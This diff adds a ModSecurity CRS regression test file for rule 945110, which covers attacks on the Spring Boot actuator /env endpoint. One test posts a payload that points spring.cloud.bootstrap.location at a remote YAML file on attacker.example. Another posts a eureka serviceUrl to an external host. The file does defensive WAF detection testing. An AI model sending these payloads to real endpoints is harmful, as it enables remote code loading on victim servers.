@@ -1,0 +1,75 @@
+---
+  meta:
+    author: "Mikhail_Rusakovich"
+    enabled: true
+    name: "945110.yaml"
+    description: "Description"
+  tests:
+    -
+      test_title: 945110-1
+      desc: POST attack on env Spring-boot actuator endpoint
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              port: 80
+              headers:
+                Host: "localhost"
+                User-Agent: "ModSecurity CRS 3 Tests"
+                Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+                Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+                Accept-Encoding: gzip,deflate
+                Accept-Language: en-us,en;q=0.5
+                Content-Type: "application/x-www-form-urlencoded"
+              method: POST
+              uri: /env
+              version: HTTP/1.1
+              data: "spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml"
+            output:
+              log_contains: "id \"945110\""
+    -
+      test_title: 945110-2
+      desc: GET attack on env Spring-boot actuator endpoint
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              port: 80
+              headers:
+                Host: "localhost"
+                User-Agent: "ModSecurity CRS 3 Tests"
+                Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+                Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+                Accept-Encoding: gzip,deflate
+                Accept-Language: en-us,en;q=0.5
+                Content-Type: "application/x-www-form-urlencoded"
+              method: GET
+              uri: /env
+              version: HTTP/1.1
+            output:
+              no_log_contains: "id \"945110\""
+    -
+      test_title: 945110-3
+      desc: FP Post attack on env Spring-boot actuator endpoint 
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              port: 80
+              headers:
+                Host: "localhost"
+                User-Agent: "ModSecurity CRS 3 Tests"
+                Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+                Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+                Accept-Encoding: gzip,deflate
+                Accept-Language: en-us,en;q=0.5
+                Content-Type: "application/x-www-form-urlencoded"
+              method: POST
+              uri: /env
+              version: HTTP/1.1
+              data: "eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream"
+            output:
+              no_log_contains: "id \"945110\""
